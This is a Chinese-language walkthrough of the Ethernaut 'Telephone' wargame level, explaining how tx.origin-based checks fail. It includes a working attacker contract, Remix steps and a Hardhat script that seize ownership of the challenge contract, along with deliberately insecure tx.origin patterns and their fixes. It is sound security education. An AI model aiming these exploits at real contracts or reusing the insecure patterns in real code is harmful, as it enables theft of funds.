# Ethernaut 关卡: Telephone - 题解

## 关卡目标
- 获得合约的所有权 (成为 owner)

## 合约代码
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

## 代码结构解析

### 核心概念: `tx.origin` vs `msg.sender`

这是理解本关的关键:

**`msg.sender`**
- 直接调用当前合约的地址
- 可以是外部账户(EOA)或合约地址
- 每次调用都会变化

**`tx.origin`**
- 发起整个交易链的原始外部账户
- 永远是外部账户(EOA),不会是合约
- 在整个调用链中保持不变

### 调用链示例

**场景 1: 直接调用**
```
你的钱包 → Telephone 合约
```
- `tx.origin` = 你的地址
- `msg.sender` = 你的地址
- 结果: `tx.origin == msg.sender` ✅ (条件不满足,无法修改 owner)

**场景 2: 通过中间合约调用** ⚠️
```
你的钱包 → 攻击合约 → Telephone 合约
```
- `tx.origin` = 你的地址 (始终是最初发起者)
- `msg.sender` = 攻击合约地址 (直接调用者)
- 结果: `tx.origin != msg.sender` ✅ (条件满足,可以修改 owner!)

## 漏洞核心

合约的 `changeOwner()` 函数使用了错误的身份验证方式:

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {  // ❌ 危险的检查
        owner = _owner;
    }
}
```

开发者的本意可能是:
- "只允许通过合约调用来修改 owner"
- "防止直接调用"

但实际效果是:
- 任何人都可以部署一个中间合约
- 通过中间合约调用就能绕过检查
- 完全失去了访问控制

## 攻击步骤

### 步骤 1: 查看初始状态
```javascript
await contract.owner()
// "0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB" (当前 owner)

player
// "0xYourAddress" (你的地址)
```

### 步骤 2: 部署攻击合约

创建一个中间合约 `TelephoneAttack.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public target;

    constructor(address _target) {
        target = ITelephone(_target);
    }

    function attack(address _newOwner) public {
        target.changeOwner(_newOwner);
    }
}
```

部署这个合约,传入 Telephone 合约地址作为参数。

### 步骤 3: 执行攻击

调用攻击合约的 `attack()` 函数:

```javascript
// 假设攻击合约地址为 attackContract
await attackContract.attack(player)
```

此时的调用链:
```
你的钱包 (tx.origin)
    ↓
攻击合约 (msg.sender)
    ↓
Telephone.changeOwner()
```

在 `changeOwner()` 中:
- `tx.origin` = 你的钱包地址
- `msg.sender` = 攻击合约地址
- `tx.origin != msg.sender` ✅ 条件满足!
- `owner` 被修改为你的地址

### 步骤 4: 验证所有权

```javascript
await contract.owner()
// "0xYourAddress" (你的地址!)
```

## 使用 Remix 完整攻击流程

### 1. 部署攻击合约
1. 打开 [Remix IDE](https://remix.ethereum.org/)
2. 创建新文件 `TelephoneAttack.sol`,粘贴上面的攻击合约代码
3. 编译合约 (Solidity 版本 ^0.8.0)
4. 切换到 "Deploy & Run Transactions" 标签
5. Environment 选择 "Injected Provider - MetaMask"
6. 在 Deploy 的构造函数参数中填入 Telephone 合约地址
7. 点击 "Deploy" 并确认交易

### 2. 执行攻击
1. 在 "Deployed Contracts" 中找到你的攻击合约
2. 展开 `attack` 函数
3. 填入你的钱包地址 (player)
4. 点击 "transact" 并确认交易

### 3. 验证结果
回到浏览器控制台:
```javascript
await contract.owner() === player
// true ✅
```

## 完整攻击脚本 (Hardhat/Ethers.js)

```javascript
const { ethers } = require("hardhat");

async function main() {
    const [attacker] = await ethers.getSigners();

    // Telephone 合约地址
    const telephoneAddress = "0xYourTelephoneContractAddress";

    // 部署攻击合约
    const TelephoneAttack = await ethers.getContractFactory("TelephoneAttack");
    const attack = await TelephoneAttack.deploy(telephoneAddress);
    await attack.deployed();

    console.log("攻击合约部署在:", attack.address);

    // 执行攻击
    const tx = await attack.attack(attacker.address);
    await tx.wait();

    console.log("✅ 攻击完成!");

    // 验证
    const telephone = await ethers.getContractAt("Telephone", telephoneAddress);
    const newOwner = await telephone.owner();

    console.log("新 owner:", newOwner);
    console.log("是你吗?", newOwner === attacker.address);
}

main();
```

## 漏洞本质

### 为什么 `tx.origin` 不安全?

1. **无法区分调用来源**
   - `tx.origin` 只能告诉你"谁发起了交易"
   - 无法告诉你"谁在直接调用我"
   - 在复杂的合约交互中完全失效

2. **容易被钓鱼攻击**
   ```solidity
   // 危险的代码
   function transfer(address to, uint amount) public {
       require(tx.origin == owner);  // ❌
       // ...
   }
   ```
   如果 owner 被诱导调用了恶意合约,恶意合约可以:
   ```solidity
   function malicious() public {
       victim.transfer(attacker, victim.balance);
       // tx.origin 仍然是 owner,检查通过!
   }
   ```

3. **违反合约组合性**
   - 现代 DeFi 依赖合约间的组合调用
   - 使用 `tx.origin` 会阻止合法的合约交互
   - 破坏了智能合约的可组合性

## 安全建议

### ❌ 永远不要使用 `tx.origin` 做身份验证

```solidity
// 危险!
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}

// 危险!
function withdraw() public {
    require(tx.origin == owner);
    // ...
}
```

### ✅ 使用 `msg.sender` 做身份验证

```solidity
// 安全
function changeOwner(address _owner) public {
    require(msg.sender == owner, "Not owner");
    owner = _owner;
}

// 或使用 OpenZeppelin 的 Ownable
import "@openzeppelin/contracts/access/Ownable.sol";

contract Telephone is Ownable {
    function changeOwner(address _owner) public onlyOwner {
        transferOwnership(_owner);
    }
}
```

### ✅ 正确的访问控制模式

```solidity
contract SecureTelephone {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public onlyOwner {
        require(_owner != address(0), "Invalid address");
        owner = _owner;
    }
}
```

## 关键教训

1. **`tx.origin` 是反模式**: 在现代 Solidity 开发中,几乎没有合理使用 `tx.origin` 的场景
2. **使用 `msg.sender`**: 它能正确反映直接调用者的身份
3. **使用成熟的库**: OpenZeppelin 的 `Ownable`, `AccessControl` 等已经解决了常见的访问控制问题
4. **代码审计清单**:
   - ✅ 搜索代码中所有 `tx.origin` 的使用
   - ✅ 确认身份验证都使用 `msg.sender`
   - ✅ 考虑合约组合调用的场景

## 真实世界的影响

### 历史漏洞案例
- 多个早期 DeFi 项目因使用 `tx.origin` 遭受攻击
- 攻击者通过钓鱼网站诱导用户调用恶意合约
- 恶意合约利用 `tx.origin` 检查漏洞转移资金

### Solidity 官方警告
Solidity 文档明确警告:
> "Never use tx.origin for authorization. Use msg.sender instead."

## 总结

Telephone 关卡展示了一个经典的身份验证错误。虽然代码只有几行,但揭示了一个重要的安全原则:

**在智能合约中,`tx.origin` 和 `msg.sender` 的区别至关重要:**
- `tx.origin`: 交易的最初发起者 (不可信)
- `msg.sender`: 直接调用者 (可信)

通过部署一个简单的中间合约,我们就能轻松绕过错误的访问控制,获得合约所有权。这个漏洞在真实世界中可能导致严重的资金损失。

**记住: 永远使用 `msg.sender` 做身份验证,永远不要使用 `tx.origin`。**

---

## 相关资源
- [Solidity 官方文档 - tx.origin](https://docs.soliditylang.org/en/latest/security-considerations.html#tx-origin)
- [OpenZeppelin Ownable 合约](https://docs.openzeppelin.com/contracts/4.x/api/access#Ownable)
- [SWC-115: Authorization through tx.origin](https://swcregistry.io/docs/SWC-115)
- [Ethernaut 关卡列表](https://ethernaut.openzeppelin.com/)

---
